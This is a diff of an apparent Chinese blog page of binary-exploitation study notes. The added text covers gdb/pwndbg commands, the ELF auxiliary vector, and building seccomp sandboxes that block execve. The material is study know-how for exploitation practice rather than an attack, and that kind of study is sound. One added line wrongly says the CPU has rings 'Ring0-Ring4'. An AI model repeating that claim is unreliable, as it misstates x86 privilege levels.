@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 108 分钟
+                    阅读时长: 116 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    53794 字
+                    57969 字
                 </time>
             </div>
         
@@ -659,7 +659,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">seccomp-tools dump ./xxx <span class="c1">#查看是否存在沙箱保护，只能执行允许的系统调用函数</span>
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">sudo seccomp-tools dump ./xxx <span class="c1">#查看是否存在沙箱保护，只能执行允许的系统调用函数</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="tmux">tmux</h3>
@@ -1318,6 +1318,8 @@
 </span><span class="lnt">95
 </span><span class="lnt">96
 </span><span class="lnt">97
+</span><span class="lnt">98
+</span><span class="lnt">99
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1">#下断点</span>
@@ -1417,6 +1419,8 @@
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">detach</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">fork</span> <span class="n">off</span> <span class="c1"># 同时调试父进程与子进程</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">pwndbg</span> <span class="c1"># 查看命令</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">retaddr</span> <span class="c1"># 查看返回地址</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>查看内存：</strong></p>
@@ -1891,6 +1895,7 @@
 <p>x86 和 x86_64 : 基于X86架构的不同版本, 位数不同，32位和64位，其中<code>x86_64 = x64 = amd64</code></p>
 <p>x86版本是Intel率先研发出x86架构, x86_64版本(也称x64)是amd率先研发x86的64位版本, 所以x86_64也叫amd64</p>
 <p>x86：一个地址存4个字节；amd64：一个地址存8个字节</p>
+<p>CPU包含4个层：Ring0-Ring4，Ring3为用户态，Ring0为内核态</p>
 <h3 id="glibc">Glibc</h3>
 <ul>
 <li>glibc-2.23：ubuntu16.04</li>
@@ -3190,7 +3195,7 @@
 <p>指向环境变量字符串的指针数组【envp】，以0结尾</p>
 </li>
 <li>
-<p>辅助信息数组：OS将其提供给动态链接器</p>
+<p>辅助向量信息数组：OS将其提供给动态链接器</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -3203,10 +3208,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">a_type</span><span class="p">;</span>      <span class="cm">/* Entry type */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">a_type</span><span class="p">;</span>      <span class="cm">/* Entry type 辅助向量的条目类型 */</span>
 </span></span><span class="line"><span class="cl">	<span class="c1">// 可执行文件文件描述符，程序头表地址及每个条目大小、条目数量，页面大小，共享对象基址，OS标志位，程序入口地址
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    	<span class="kt">uint32_t</span> <span class="n">a_val</span><span class="p">;</span>       <span class="cm">/* Integer value */</span>
+</span></span><span class="line"><span class="cl">    	<span class="kt">uint32_t</span> <span class="n">a_val</span><span class="p">;</span>       <span class="cm">/* Integer value 辅助向量的值 */</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">a_un</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf32_auxv_t</span><span class="p">;</span>
 </span></span></code></pre></td></tr></table>
@@ -3263,7 +3268,26 @@
 	
 	
 ></p>
-<h3 id="虚拟空间">虚拟空间</h3>
+<p>内核执行过程：<code>sys_execve()</code> -&gt; <code>do_execve_common()</code> -&gt; <code>search_binary_handler()</code> -&gt; <code>load_elf_binary()</code> -&gt; <code>create_elf_tables()</code>，<code>create_elf_tables()</code>会添加辅助向量条目</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NEW_AUX_ENT</span><span class="p">(</span><span class="n">AT_PAGESZ</span><span class="p">,</span> <span class="n">ELF_EXEC_PAGESIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEW_AUX_ENT</span><span class="p">(</span><span class="n">AT_PHDR</span><span class="p">,</span> <span class="n">load_addr</span> <span class="o">+</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">e_phoff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEW_AUX_ENT</span><span class="p">(</span><span class="n">AT_PHENT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">elf_phdr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEW_AUX_ENT</span><span class="p">(</span><span class="n">AT_PHNUM</span><span class="p">,</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">e_phnum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEW_AUX_ENT</span><span class="p">(</span><span class="n">AT_BASE</span><span class="p">,</span> <span class="n">interp_load_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEW_AUX_ENT</span><span class="p">(</span><span class="n">AT_ENTRY</span><span class="p">,</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">e_entry</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="虚拟空间">虚拟空间</h3>
 <p>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</p>
 <ul>
 <li>每个进程有自己虚拟地址空间，由连续虚拟地址组成，不直接访问物理内存地址</li>
@@ -4512,15 +4536,151 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div></li>
-<li></li>
 </ul>
-<h2 id="沙箱sandbox">沙箱Sandbox</h2>
-<p>限制execve导致不能使用onegadget和system调用，一般两种方式开启沙箱</p>
+<h2 id="沙箱绕过">沙箱绕过</h2>
+<h3 id="seccomp">Seccomp</h3>
+<p>Sandbox，限制execve导致不能使用onegadget和system调用，一般两种方式开启沙箱</p>
+<blockquote>
+<ol>
+<li><code>PR_SET_SECCOMP</code>是linux内核提供的一种机制，限制进程可执行的系统调用，可通过<code>prctl()</code>系统调用设置（可以通过<code>PR_SET_SECCOMP</code>设置进程的seccomp过滤器或<code>PR_SET_NO_NEW_PRIVS</code>设置进程的<code>no_new_privs</code>标志</li>
+<li>seccomp过滤器通过BPF(Berkeley Packet Filter)程序实现，可以过滤进程所发起的系统调用并限制；seccomp过滤器只在进程启动时设置，一旦设置不可修改</li>
+<li><code>PR_SET_NO_NEW_PRIVS</code>标志可禁止进程获取更高权限，防止进程提权</li>
+</ol>
+</blockquote>
 <ul>
 <li>采用prctl函数调用</li>
 <li>使用seccomp库函数</li>
 </ul>
-<p><strong>prctl</strong>——系统调用，控制和修改进程的行为和属性，决定系统调用</p>
+<p>编写沙箱规则保存在<code>rule</code>文件中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="n">ARCH_X86_64</span> <span class="o">?</span> <span class="nl">next</span> <span class="p">:</span> <span class="n">kill</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">&gt;=</span> <span class="mh">0x40000000</span> <span class="o">?</span> <span class="nl">kill</span> <span class="p">:</span> <span class="n">next</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span> <span class="o">?</span> <span class="nl">kill</span> <span class="p">:</span> <span class="n">allow</span>
+</span></span><span class="line"><span class="cl"><span class="nl">allow</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">ALLOW</span>
+</span></span><span class="line"><span class="cl"><span class="nl">kill</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">KILL</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过<code>seccomp-tools</code>将规则转换为可被<code>PR_SET_SECCOMP</code>识别的规则</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ seccomp-tools asm rule -a amd64 -f raw <span class="p">|</span> hexdump
+</span></span><span class="line"><span class="cl">$ seccomp-tools asm rule -a amd64 -f raw <span class="p">|</span> seccomp-tools disasm -
+</span></span><span class="line"><span class="cl"> line  CODE  JT   JF      <span class="nv">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
+</span></span><span class="line"><span class="cl"> 0001: 0x15 0x00 0x04 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
+</span></span><span class="line"><span class="cl"> 0003: 0x35 0x02 0x00 0x40000000  <span class="k">if</span> <span class="o">(</span>A &gt;<span class="o">=</span> 0x40000000<span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0004: 0x15 0x01 0x00 0x0000003b  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> execve<span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0006: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将规则应用于C程序中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/seccomp.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/filter.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 定义过滤器规则 存放机器码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">filter</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00000004</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xc000003e</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0000003b</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x7fff0000</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">prog</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">)</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">filter</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filter</span><span class="p">[</span><span class="mi">0</span><span class="p">])),</span> <span class="c1">// 过滤器长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">filter</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 设置seccomp过滤器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_SECCOMP</span><span class="p">,</span> <span class="n">SECCOMP_MODE_FILTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;[-] prctl error.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 执行系统调用 将会失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;-i&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>prctl</strong>——系统调用，控制和修改进程的行为和属性，决定系统调用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4552,15 +4712,141 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1">// arg2: #define SECCOMP_MODE_FILTER 2 BPF过滤:对syscall的限制通过arg3的Berkeley Packet Filter相关结构体定义
 </span></span></span></code></pre></td></tr></table>
 </div>
+</div><p><strong>使用Seccomp创建Seccomp</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc test.c -o test -lseccomp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;seccomp.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 创建过滤器上下文
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">scmp_filter_ctx</span> <span class="n">ctx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ctx</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="n">SCMP_ACT_ALLOW</span><span class="p">);</span> <span class="c1">// 默认allow
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 添加过滤规则
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">seccomp_arch_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ARCH_X86_64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_KILL</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">execve</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">seccomp_load</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">// 执行系统调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;-i&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>seccomp_arch_add</code>函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">scmp_filter_ctx</span> <span class="n">ctx</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">action</span><span class="p">,</span> <span class="kt">int</span> <span class="n">syscall</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">arg_cnt</span><span class="p">,</span> <span class="p">...);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ctx: 过滤器上下文，存储过滤规则
+</span></span></span><span class="line"><span class="cl"><span class="c1">// action: 规则匹配时的操作:SCMP_ACT_ALLOW允许系统调用, SCMP_ACT_KILL杀死进程, SCMP_ACT_ERRNO返回错误码并允许系统调用
+</span></span></span><span class="line"><span class="cl"><span class="c1">// syscall: 限制的系统调用号
+</span></span></span><span class="line"><span class="cl"><span class="c1">// arg_cnt: 要匹配的参数数量
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ...: 指定要匹配的参数值, 每个参数一个scmp_arg_cmp结构体, 包含参数比较方法和比较值
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>scmp_arg_cmp</code>结构体</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">scmp_arg_cmp</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">arg</span><span class="p">;</span>   <span class="cm">/**&lt; argument number, starting at 0 要比较的参数序号*/</span>
+</span></span><span class="line"><span class="cl">    <span class="k">enum</span> <span class="n">scmp_compare</span> <span class="n">op</span><span class="p">;</span>   <span class="cm">/**&lt; the comparison op 比较方式 */</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_NE: 不等于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_EQ: 等于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_LT: 小于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_LE: 小于等于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_GT: 大于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_GE: 大于等于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    	SCMP_CMP_MASKED_EQ: 按位与后等于
+</span></span></span><span class="line"><span class="cl"><span class="cm">    **/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scmp_datum_t</span> <span class="n">datum_a</span><span class="p">;</span>	<span class="c1">// 用来于参数比较的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">scmp_datum_t</span> <span class="n">datum_b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 规定 read 必须从标准输入读取不超过 BUF_SIZE 的内容到 buf 中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define BUF_SIZE 0x100
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">read</span><span class="p">),</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">SCMP_A0</span><span class="p">(</span><span class="n">SCMP_CMP_EQ</span><span class="p">,</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stdin</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">SCMP_A1</span><span class="p">(</span><span class="n">SCMP_CMP_EQ</span><span class="p">,</span> <span class="p">(</span><span class="n">scmp_datum_t</span><span class="p">)</span> <span class="n">buf</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                 <span class="n">SCMP_A2</span><span class="p">(</span><span class="n">SCMP_CMP_LE</span><span class="p">,</span> <span class="n">BUF_SIZE</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div><p><strong>seccomp</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mi">111LL</span><span class="p">);</span> <span class="c1">// 初始化，参数表示用于过滤的操作模式
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// IDA 中显示
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">v</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mi">111LL</span><span class="p">);</span> <span class="c1">// 初始化，参数表示用于过滤的操作模式
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">59LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 禁用59系统调用号execve
